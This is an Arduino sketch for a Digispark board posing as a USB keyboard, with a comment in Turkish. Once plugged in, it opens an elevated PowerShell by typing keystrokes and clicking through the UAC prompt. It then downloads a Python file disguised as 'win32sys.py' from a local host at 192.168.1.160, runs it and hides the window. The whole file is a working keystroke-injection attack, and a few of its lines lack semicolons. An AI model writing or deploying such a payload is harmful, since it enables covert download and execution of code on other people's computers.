#define kbd_tr_tr
#define KEY_TAB 43
#include "DigiKeyboard.h"

const int ledPin = 1;

void setup() {
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  pinMode(ledPin, OUTPUT);
}

void loop() {
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
   DigiKeyboard.delay(1000);

   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(1000);
   
   DigiKeyboard.print("powershell");
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
   DigiKeyboard.delay(10000);
   // Tab sayısı win10 da 2 win11 de 3 
   DigiKeyboard.sendKeyStroke(KEY_TAB);
   DigiKeyboard.delay(700);
   DigiKeyboard.sendKeyStroke(KEY_TAB);
   DigiKeyboard.delay(700);
   DigiKeyboard.sendKeyStroke(KEY_TAB);
   DigiKeyboard.delay(700);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(700);

   DigiKeyboard.print("$client = New-Object System.Net.WebClient");
   DigiKeyboard.delay(600);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(600);

   DigiKeyboard.print("$client.DownloadFile('http://192.168.1.160/win32sys.py', 'win32sys.py')");
   DigiKeyboard.delay(600);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(600);

   DigiKeyboard.print("Start-Process python -ArgumentList win32sys.py -NoNewWindow");
   DigiKeyboard.delay(600);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(600);

   DigiKeyboard.print("powershell -WindowStyle Hidden")
   DigiKeyboard.delay(600)
   DigiKeyboard.sendKeyStroke(KEY_ENTER)

   for(int i = 0; i < 10; i++) {
       digitalWrite(ledPin, HIGH);
       delay(500);              
       digitalWrite(ledPin, LOW);
       delay(500);              
   }

   while(true) {}
}